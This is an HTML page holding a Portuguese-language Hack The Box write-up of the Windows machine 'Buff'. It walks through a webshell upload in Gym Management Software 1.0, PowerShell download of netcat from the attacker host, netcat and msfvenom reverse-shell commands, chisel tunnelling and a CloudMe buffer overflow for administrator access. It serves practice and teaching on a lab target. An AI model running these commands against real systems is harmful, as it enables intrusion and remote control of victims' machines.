@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>buff — htb writeup · chu@antisec</title>
+    <meta name="description" content="writeup htb buff (windows): gym management 1.0 com upload de webshell sem auth, chisel pra portforward e buffer overflow no cloudme 1.11.2. em português.">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <a class="skip" href="#main">skip to content</a>
+
+    <header class="chrome">
+      <div class="wrap chrome-in">
+        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="main">
+          <ul>
+            <li><a href="../index.html">home</a></li>
+            <li><a href="../research/index.html">research</a></li>
+            <li><a href="index.html" aria-current="page">writeups</a></li>
+            <li><a href="../about.html">about</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main">
+      <article class="wrap hero">
+
+        <p class="crumbs"><a href="index.html">← ../</a> writeups</p>
+        <h1 class="h-prompt"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat buff.md</h1>
+        <div class="small dim"><script src="https://www.hackthebox.eu/badge/148108"></script></div>
+        <p class="cmd">Buff - HackTheBox - WriteUp</p>
+
+        <ul class="meta">
+          <li class="chip">date=2025-02-16</li>
+          <li class="chip">os=windows</li>
+          <li class="chip">lang=pt-br</li>
+          <li class="chip chip--phos">status=root</li>
+        </ul>
+
+        <figure class="fig">
+          <a href="https://i.imgur.com/R54hsZz.png"><img src="https://i.imgur.com/R54hsZz.png" alt="Buff" loading="lazy"></a>
+          <figcaption class="fig-cap"><b>buff</b> — card da máquina no hackthebox</figcaption>
+        </figure>
+
+        <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
+        <p><strong>Tools</strong> utilizadas</p>
+        <ul class="chips">
+          <li class="chip">Nmap</li>
+          <li class="chip">Python</li>
+          <li class="chip">Powershell</li>
+          <li class="chip">Netcat</li>
+          <li class="chip">msfvenom</li>
+          <li class="chip">chisel</li>
+        </ul>
+
+        <div class="prose">
+          <p>Vamos iniciar fazendo um scan com o Nmap procurando portas e serviços ativos:</p>
+
+          <p>Ao acessar o serviço Web, podemos encontrar a versão do CMS utilizado no site:</p>
+          <div class="code">
+            <div class="code-cap"><span class="dot">●</span> <span>url</span></div>
+            <pre><code>http://10.10.10.198:8080/contact.php</code></pre>
+        </div>
+
+        <figure class="fig">
+          <a href="https://i.imgur.com/DiDlRxp.png"><img src="https://i.imgur.com/DiDlRxp.png" alt="Image" loading="lazy"></a>
+          <figcaption class="fig-cap"><b>gym management</b> — página de contato do CMS</figcaption>
+        </figure>
+
+        <div class="code">
+          <div class="code-cap"><span class="dot">●</span> <span>versão</span></div>
+          <pre><code>Gym Management Software 1.0</code></pre>
+      </div>
+
+      <p>Após encontrarmos a versão do CMS, podemos buscar por falhas já conhecidas sobre ele.</p>
+
+      <p>No site <a href="https://www.exploit-db.com/">Exploit-DB</a> encontramos alguns exploits e um deles nos parece muito interessante;</p>
+
+      <figure class="fig">
+        <a href="https://i.imgur.com/lsXr8UN.png"><img src="https://i.imgur.com/lsXr8UN.png" alt="Image" loading="lazy"></a>
+        <figcaption class="fig-cap"><b>exploit-db</b> — busca por exploits do CMS</figcaption>
+      </figure>
+
+      <p>O <a href="https://www.exploit-db.com/exploits/48506">exploit</a>, consegue executar comandos de forma remota e sem autenticação!</p>
+
+      <p>Bom, vamos testa-lo!</p>
+
+      <figure class="fig">
+        <a href="https://i.imgur.com/APlOWvl.png"><img src="https://i.imgur.com/APlOWvl.png" alt="Image" loading="lazy"></a>
+        <figcaption class="fig-cap"><b>rce</b> — exploit executado com sucesso</figcaption>
+      </figure>
+
+      <p>Podemos ver que o exploit funcionou e realizou o upload de uma webshell. XD</p>
+
+      <p>Nossa webshell foi inserida no caminho:</p>
+      <div class="code">
+        <div class="code-cap"><span class="dot">●</span> <span>webshell</span></div>
+        <pre><code>http://10.10.10.198:8080/upload/kamehameha.php</code></pre>
+    </div>
+
+    <p>Se quisermos utilizar o navegador para realizar comandos utilizamos o parametro 'telepathy' para passar nossos comandos:
+      Ex:</p>
+
+    <figure class="fig">
+      <a href="https://i.imgur.com/sfh8O6T.png"><img src="https://i.imgur.com/sfh8O6T.png" alt="Image" loading="lazy"></a>
+      <figcaption class="fig-cap"><b>telepathy</b> — comando via parâmetro</figcaption>
+    </figure>
+
+    <div class="code">
+      <div class="code-cap"><span class="dot">●</span> <span>url</span></div>
+      <pre><code>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami</code></pre>
+  </div>
+
+  <p>Vamos usar a shell em nosso terminal. Após conseguirmos executar comandos, vamos tentar realizar a conexão reversa.
+    Subiremos um servidor com python em nossa máquina para enviarmos o netcat para nosso alvo:</p>
+
+  <figure class="fig">
+    <a href="https://i.imgur.com/A76DKtv.png"><img src="https://i.imgur.com/A76DKtv.png" alt="Image" loading="lazy"></a>
+    <figcaption class="fig-cap"><b>python</b> — subindo servidor de arquivos</figcaption>
+  </figure>
+
+  <div class="code">
+    <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+    <pre><code>python -m SimpleHTTPServer 80</code></pre>
+</div>
+
+<p>Vamos tentar jogar o netcat dentro da máquina alvo, através de nossa shell inicial.</p>
+
+<p>Vamos usar o PowerShell para isso</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/o8Mxo8K.png"><img src="https://i.imgur.com/o8Mxo8K.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>powershell</b> — download do netcat</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>powershell Invoke-WebRequest -Uri 'http://10.10.14.146/nc.exe'-OutFile 'C:\xampp\htdocs\gym\upload\nc.exe'</code></pre>
+</div>
+
+<p>Após realizarmos o upload, vamos fazer a conexão com nossa máquina através do netcat.</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/eAPcQcR.png"><img src="https://i.imgur.com/eAPcQcR.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>reverse shell</b> — conexão via netcat</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>.\nc.exe 10.10.14.146 433 -e powershell.exe</code></pre>
+</div>
+
+<p>Em nossa máquina, abrimos a porta 443 para o netcat se conectar:</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/21enBIH.png"><img src="https://i.imgur.com/21enBIH.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>netcat</b> — listener na porta 443</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>nc -vnlp 443</code></pre>
+</div>
+
+<p>Ao ganhar o acesso inicial e realizarmos a enumeração do que está rodando na máquina, podemos encontrar um software chamado CloudMe 1.11.2</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/AJwypaK.png"><img src="https://i.imgur.com/AJwypaK.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>cloudme</b> — enumeração de software</figcaption>
+</figure>
+
+<p>Vamos fazer como fizemos no outro software, vamos buscar por falhas conhecidas:</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/c3I6v0R.png"><img src="https://i.imgur.com/c3I6v0R.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>exploit-db</b> — falhas do cloudme</figcaption>
+</figure>
+
+<p>Ao pesquisar mais a fundo sobre esse software, é possível encontrar um <a href="https://www.exploit-db.com/exploits/48389">exploit</a> que utiliza Buffer Overflow na versão 1.11.2 para escalção de privilégios.</p>
+
+<p>Ao analisar o CloudMe, podemos ver que ele está rodando somente local...
+  Nosso alvo não possuí python para conseguirmos executar o exploit...
+  Vamos tentar um portforward para executar o exploit.
+  Na primeira vez que fiz essa box, usei o plink.exe, porém, quando fui refazer para tirar as prints, tentei durante horas e não funcionou...</p>
+
+<p>Para isso vamos tentar utilizar o chisel.exe para isso:</p>
+
+<p>Vamos envia-lo para a máquina:</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/LTIYDYM.png"><img src="https://i.imgur.com/LTIYDYM.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>powershell</b> — enviando o binário</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>powershell Invoke-WebRequest -Uri 'http://10.10.14.145/windao.exe'-OutFile 'C:\xampp\htdocs\gym\upload\windao.exe'</code></pre>
+</div>
+
+<p><em>Salvei com esse nome pra evitar outras pessoas usando o mesmo arquivo(RIP vip)</em></p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/LoeaAmJ.png"><img src="https://i.imgur.com/LoeaAmJ.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>upload</b> — binário já no alvo</figcaption>
+</figure>
+
+<p>Vamos editar o payload do exploit para conectar-se a nossa máquina:
+  Usando o msfvenom criamos um payload:</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/fabuhuw.png"><img src="https://i.imgur.com/fabuhuw.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>msfvenom</b> — gerando o payload</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nc.exe 10.10.14.145 4444 -e cmd.exe' -b '\x00\x0A\x0D' -f python -v payload</code></pre>
+</div>
+
+<p>Após isso inserimos ele dentro de nosso exploit(48389.py).</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/mRyjpnO.png"><img src="https://i.imgur.com/mRyjpnO.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>exploit</b> — payload inserido no 48389.py</figcaption>
+</figure>
+
+<p>Ativando o Chisel como server:</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/a37b5Y2.png"><img src="https://i.imgur.com/a37b5Y2.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>chisel</b> — server em nossa máquina</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>./chisel server --reverse --port 10001</code></pre>
+</div>
+
+<p>Usando o Chisel como client:</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/LuzPSpK.png"><img src="https://i.imgur.com/LuzPSpK.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>chisel</b> — client no alvo</figcaption>
+</figure>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>.\chisel.exe client 10.10.14.145:10001 R:3306:localhost:3306 R:8888:localhost:8888</code></pre>
+</div>
+
+<p>Após a conexão ser concluida no Chisel, podemos executar o exploit já editado com o nosso payload, que realiza uma conexão na porta 4444, portanto, abrimos a porta com o netcat e aguardamos a conexão. Obs: tive que executar o exploit mais de uma vez para receber a conexão.</p>
+
+<div class="code">
+  <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
+  <pre><code>nc -vvnlp 4444</code></pre>
+</div>
+
+<p>agora somos admin/root XD</p>
+
+<figure class="fig">
+  <a href="https://i.imgur.com/ynbFR0B.png"><img src="https://i.imgur.com/ynbFR0B.png" alt="Image" loading="lazy"></a>
+  <figcaption class="fig-cap"><b>root</b> — shell de administrador</figcaption>
+</figure>
+
+<p>if i helped you, add + respect at my profile :D</p>
+</div>
+
+<section class="sec sec--flush">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">[--]</span>
+    <h2 class="sec-title">My references:</h2>
+  </div>
+  <div class="code">
+    <div class="code-cap"><span class="dot">●</span> <span>references</span></div>
+    <pre><code><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>
+<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a>
+<a href="https://ippsec.rocks/">https://ippsec.rocks/</a></code></pre>
+  </div>
+</section>
+
+<nav class="post-nav" aria-label="writeup navigation">
+  <span>← prev:</span><a href="coder.html">coder</a>
+  <span>next →</span><span class="dim">fim da lista — volta pro <a href="index.html">índice</a></span>
+</nav>
+
+</article>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-row">
+      <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
+    </div>
+    <div class="foot-row">
+      <p>© 2026 chu · <a href="../index.html">home</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contact</a></p>
+    </div>
+  </div>
+</footer>
+<script src="../zoom.js" defer></script>
+</body>
+</html>
